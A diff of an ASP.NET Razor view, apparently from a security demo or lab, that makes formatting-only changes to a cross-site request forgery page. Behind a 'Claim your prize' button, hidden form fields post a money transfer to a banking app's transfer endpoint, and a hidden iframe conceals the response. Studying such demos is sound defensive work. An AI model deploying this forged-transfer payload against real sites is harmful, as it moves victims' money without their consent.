@@ -1,18 +1,17 @@
-﻿
-@{
+﻿@{
     ViewData["Title"] = "Prize";
 }
 
 <h1>Prize</h1>
 
 <form method="post" action="https://localhost:5001/Transfer/CreateTransfer" target="HiddenIframe">
-    <input type="hidden" name="DestinationClientEmail" value="goodguy@a.a" />
-    <input type="hidden" name="DestinationAccountNumber" value="869af683-1d4c-4667-bd36-88e1defdb894" />
-    <input type="hidden" name="SourceAccountNumber" value="a2ceaffe-9d65-45e0-a865-c48ce1527b01" />
-    <input type="hidden" name="Currency" value="1" />
-    <input type="hidden" name="Amount" value="10" />
-    <input type="hidden" name="Details" value="Aaaaand it's gone! K, thx, bye!" />
-    <input type="submit" value="Claim your prize right now!" />
+    <input type="hidden" name="DestinationClientEmail" value="goodguy@a.a"/>
+    <input type="hidden" name="DestinationAccountNumber" value="869af683-1d4c-4667-bd36-88e1defdb894"/>
+    <input type="hidden" name="SourceAccountNumber" value="a2ceaffe-9d65-45e0-a865-c48ce1527b01"/>
+    <input type="hidden" name="Currency" value="1"/>
+    <input type="hidden" name="Amount" value="10"/>
+    <input type="hidden" name="Details" value="Aaaaand it's gone! K, thx, bye!"/>
+    <input type="submit" value="Claim your prize right now!"/>
 </form>
 
 <iframe name="HiddenIframe" hidden="hidden"></iframe>
